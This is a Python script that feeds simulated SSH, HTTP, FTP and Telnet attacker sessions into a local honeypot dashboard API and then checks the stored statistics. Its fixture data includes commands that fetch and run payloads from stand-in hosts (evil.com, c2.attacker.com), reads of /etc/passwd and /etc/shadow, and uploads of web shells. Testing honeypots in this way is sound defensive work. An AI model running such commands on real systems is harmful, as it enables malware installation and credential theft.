"""Simulate realistic honeypot sensor traffic across all 4 protocols."""
import os, urllib.request, urllib.error, json, uuid, time

HOST = 'http://localhost:8000'
IKEY = os.environ.get('INTERNAL_API_KEY', 'changeme_internal_api_key_please_change')

def req(method, path, body=None, headers=None):
    url = HOST + path
    data = json.dumps(body).encode() if body else None
    hdrs = {'Content-Type': 'application/json'} if body else {}
    if headers:
        hdrs.update(headers)
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r)
        c = resp.read().decode()
        return resp.status, json.loads(c) if c.strip() else {}
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read().decode())
    except urllib.error.URLError as e:
        return 0, {'error': str(e.reason)}

tok = req('POST', '/api/v1/auth/login', {'username': 'testadmin2', 'password': 'TestPassword123'})[1].get('access_token', '')
hdr = {'Authorization': f'Bearer {tok}'}

print('=== SIMULATING SENSOR TRAFFIC ===')
total = 0

# 1. SSH — interactive, multiple commands, credential guessing
print('\n--- SSH SENSOR ---')
ssh_attacks = [
    ('91.121.10.1', 'root', 'admin123', ['whoami', 'id', 'uname -a', 'cat /etc/passwd', 'wget http://evil.com/malware.sh', 'chmod +x malware.sh', './malware.sh']),
    ('91.121.10.2', 'admin', 'Passw0rd!', ['ls -la', 'ps aux', 'netstat -tlnp']),
    ('185.220.101.50', 'ubuntu', 'ubuntu', ['apt-get update', 'apt-get install -y python3-pip']),
    ('45.33.32.200', 'pi', 'raspberry', ['sudo su', 'cat /etc/shadow', 'ssh-keygen -t rsa']),
    ('162.247.74.222', 'test', 'test123', ['echo vulnerable', 'id', 'curl http://c2.attacker.com/payload']),
]
for ip, user, pwd, cmds in ssh_attacks:
    sid = f'sim-ssh-{uuid.uuid4().hex[:8]}'
    st, b = req('POST', '/api/v1/events/ingest', {
        'sensor_type': 'ssh', 'attacker_ip': ip,
        'attacker_port': 60000, 'sensor_port': 2222, 'session_id': sid,
        'username': user, 'password': pwd, 'commands': cmds,
        'credentials': [{'username': user, 'password': pwd}]
    }, headers={'X-Internal-API-Key': IKEY})
    print(f'  [{st}] SSH {ip} -> user={user}, cmds={len(cmds)}')
    total += 1
    time.sleep(0.05)

# 2. HTTP — web scanners, exploit attempts
print('\n--- HTTP SENSOR ---')
http_attacks = [
    ('185.220.101.1', 'GET /wp-login.php'),
    ('185.220.101.3', 'POST /xmlrpc.php'),
    ('45.33.32.156', 'GET /.env'),
    ('45.33.32.157', 'GET /admin/'),
    ('162.247.74.201', 'POST /api/users'),
    ('103.235.46.10', 'GET /wp-content/plugins/'),
    ('196.52.80.1', 'GET /cgi-bin/'),
    ('91.121.10.99', 'POST /login HTTP/1.1'),
    ('185.220.101.99', 'GET /debug/status'),
    ('45.33.32.199', 'GET /backup/config.bak'),
]
for ip, req_line in http_attacks:
    sid = f'sim-http-{uuid.uuid4().hex[:8]}'
    st, b = req('POST', '/api/v1/events/ingest', {
        'sensor_type': 'http', 'attacker_ip': ip,
        'attacker_port': 40000, 'sensor_port': 8080, 'session_id': sid,
        'commands': [req_line],
    }, headers={'X-Internal-API-Key': IKEY})
    print(f'  [{st}] HTTP {ip} -> {req_line[:40]}')
    total += 1
    time.sleep(0.05)

# 3. FTP — credential guessing, malware uploads
print('\n--- FTP SENSOR ---')
ftp_attacks = [
    ('103.235.46.1', 'anonymous', 'test@test.com', ['USER anonymous', 'PASS test@test.com', 'SYST', 'PWD', 'CWD /incoming', 'STOR ransomware.exe']),
    ('103.235.46.2', 'admin', 'ftpadmin', ['USER admin', 'PASS ftpadmin', 'LIST', 'STOR backdoor.php']),
    ('196.52.80.5', 'user', 'pass123', ['USER user', 'PASS pass123', 'RETR /etc/passwd']),
    ('91.121.10.200', 'test', 'password', ['USER test', 'PASS password', 'MKD /uploads', 'CWD /uploads', 'STOR shell.php']),
]
for ip, user, pwd, cmds in ftp_attacks:
    sid = f'sim-ftp-{uuid.uuid4().hex[:8]}'
    st, b = req('POST', '/api/v1/events/ingest', {
        'sensor_type': 'ftp', 'attacker_ip': ip,
        'attacker_port': 50000, 'sensor_port': 2121, 'session_id': sid,
        'username': user, 'password': pwd, 'commands': cmds,
        'credentials': [{'username': user, 'password': pwd}]
    }, headers={'X-Internal-API-Key': IKEY})
    print(f'  [{st}] FTP {ip} -> user={user}, cmds={len(cmds)}')
    total += 1
    time.sleep(0.05)

# 4. Telnet — brute force, IoT scanning
print('\n--- TELNET SENSOR ---')
telnet_attacks = [
    ('196.52.80.1', 'cisco', 'cisco', ['enable', 'show running-config', 'configure terminal']),
    ('196.52.80.2', 'admin', '1234', ['ls', 'cat /proc/cpuinfo']),
    ('45.33.32.158', 'root', 'xc3511', ['cat /proc/mtd', 'cat /var/log/messages']),
]
for ip, user, pwd, cmds in telnet_attacks:
    sid = f'sim-telnet-{uuid.uuid4().hex[:8]}'
    st, b = req('POST', '/api/v1/events/ingest', {
        'sensor_type': 'telnet', 'attacker_ip': ip,
        'attacker_port': 55000, 'sensor_port': 2323, 'session_id': sid,
        'username': user, 'password': pwd, 'commands': cmds,
        'credentials': [{'username': user, 'password': pwd}]
    }, headers={'X-Internal-API-Key': IKEY})
    print(f'  [{st}] Telnet {ip} -> user={user}, cmds={len(cmds)}')
    total += 1
    time.sleep(0.05)

print(f'\n=== INJECTED {total} EVENTS TOTAL ===')

# Verify data capture
print('\n=== VERIFYING DATA CAPTURE ===')
st, stats = req('GET', '/api/v1/events/stats', headers=hdr)
if st == 200:
    print(f'Total attacks: {stats["total_attacks"]}')
    print(f'Unique IPs: {stats["unique_ips"]}')
    print(f'Sensor breakdown:')
    for s in stats.get('top_sensors', []):
        print(f'  - {s["sensor"]}: {s["count"]}')
    print(f'Top countries ({len(stats.get("top_countries", []))}):')
    for c in stats.get('top_countries', []):
        print(f'  - {c["country"]}: {c["count"]}')
    print(f'Timeline: {len(stats.get("attacks_over_time", []))} days')

# Verify event detail completeness
st, events = req('GET', '/api/v1/events/?limit=5', headers=hdr)
if st == 200:
    print(f'\nLatest events sample:')
    for ev in events[:5]:
        st2, detail = req('GET', f'/api/v1/events/{ev["session_id"]}', headers=hdr)
        if st2 == 200:
            cmds = len(detail.get('commands', []))
            creds = len(detail.get('credentials', []))
            malware = len(detail.get('malware_samples', []))
            print(f'  ID={ev["id"]} type={ev["sensor_type"]:6s} ip={ev["attacker_ip"]:15s} '
                  f'cmds={cmds} creds={creds} malware={malware}')

# Verify CSV export still works
r = urllib.request.Request(f'{HOST}/api/v1/export/csv', headers=hdr)
st_csv = urllib.request.urlopen(r).getcode()
print(f'\nCSV export: {st_csv} (OK)')

print('\n=== SIMULATION COMPLETE ===')
